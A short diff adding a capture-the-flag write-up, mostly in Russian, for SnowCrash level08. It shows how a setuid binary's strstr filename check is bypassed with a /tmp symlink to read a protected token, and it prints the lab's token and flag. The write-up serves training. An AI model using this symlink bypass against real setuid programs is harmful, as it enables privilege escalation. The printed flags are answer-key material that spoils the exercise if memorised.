@@ -1,0 +1,25 @@
+level08
+
+$ ls -l
+total 16
+-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
+-rw-------  1 flag08 flag08    26 Mar  5  2016 token
+
+снова suid
+
+$ ./level08
+./level08 [file to read]
+
+$ ./level08 token
+You may not access 'token'
+
+При изучении двоичного файла мы видим, что он использует strstr, чтобы убедиться, что имя файла не содержит слова "токен". Поэтому мы хотим, чтобы двоичный файл читал файл с другим именем, поэтому мы создаем символическую ссылку, которая не содержит "токен" в своем имени:
+
+
+level08@SnowCrash:~$ ln -sfv $PWD/token /tmp/break
+`/tmp/break' -> `/home/user/level08/token'
+level08@SnowCrash:~$ ./level08 /tmp/break
+quif5eloekouj29ke0vouxean
+flag08@SnowCrash:~$ getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
+
